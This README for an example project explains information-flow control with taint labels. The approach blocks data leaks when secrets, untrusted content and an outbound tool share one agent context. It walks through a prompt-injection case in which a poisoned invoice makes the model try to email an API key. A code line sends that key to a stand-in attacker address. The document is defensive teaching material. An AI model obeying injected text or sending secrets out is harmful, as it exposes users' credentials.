# Information-flow control — surviving a successful prompt injection

A poisoned document tells the model to exfiltrate an API key. **The model
obeys.** The exfiltration fails anyway.

That distinction is the whole idea. Input filters are detectors, and detectors
lose to the next phrasing. This is not a detector — the provenance of each piece
of data travels with it, and the outbound tool is refused because of *what is in
the context*, not because of what the text said.

## Run

```bash
bun examples/information-flow-control/index.ts
```

```
3. Model obeys the injection and calls send_email:
   [flow] DENIED tool:send_email — lethal-trifecta
   tool result: success=false
   Flow denied: context holds sensitive data alongside untrusted content…

   emails actually sent: 0
   The injection worked. The exfiltration did not.
```

## The lethal trifecta

An agent is exploitable when three things share one context:

1. **Sensitive data** — the secret worth stealing
2. **Untrusted content** — attacker-controlled text that can carry instructions
3. **An outbound sink** — a way to send something out

Any two are safe. All three is an exfiltration path, and prompt injection is
merely the trigger. So the control blocks the *combination*, not the phrasing.

## How provenance travels

Every value carries a `TaintLabel`: sensitivity `classes`, an `origin`
(`trusted` / `model` / `untrusted`), and `sources` for audit. Labels join as
data merges:

```ts
const secret = taint('sk-live-…', { classes: ['secret'], origin: 'trusted', source: 'vault' })
tracker.unwrap(secret)
// context: origin=trusted classes=[secret]

await guardedInvoice.execute({ id: '882' })   // returns attacker-controlled text
// context: origin=untrusted classes=[secret]  ← the trifecta is now complete

await guardedEmail.execute({ to: 'attacker@evil.com', body: apiKey })
// denied
```

Joins only move **upward**: the origin becomes the least trusted of the two,
and classes union. Nothing read later can launder an earlier taint away, which
is what makes the check at the sink meaningful — by then the model has already
seen everything.

## Why not just filter the input?

Filtering asks "does this text look like an injection?" — a question with no
stable answer. This asks "given everything now in context, may data reach this
destination?" — a question with a decidable one.

The second run in the example shows the flip side: the *same* `send_email` tool,
the *same* policy, a secret in context — and it goes through, because no
untrusted content is present. The control is not a blanket ban on a tool.

## Where it plugs in

| Layer | API | Sink checked |
|---|---|---|
| Tools | `withFlowControl(tool, { tracker })` | `tool:<name>`, or a custom sink like `network:api.stripe.com` |
| Gateway | `flowMiddleware({ tracker })` | `llm:<provider>` — jurisdiction rules ("EU data never reaches a US-hosted model") work here |

## Declassification

Downgrading a label is the only way to weaken it, and it is deliberately
awkward: explicit call, mandatory reason, recorded actor.

```ts
declassify(reviewed, { to: { origin: 'trusted' }, reason: 'approved by compliance', by: 'analyst-7' })
// label.sources gains 'declassified-by:analyst-7'
```

Every declassification is a hole in the guarantee, so each one is greppable in
the audit trail.
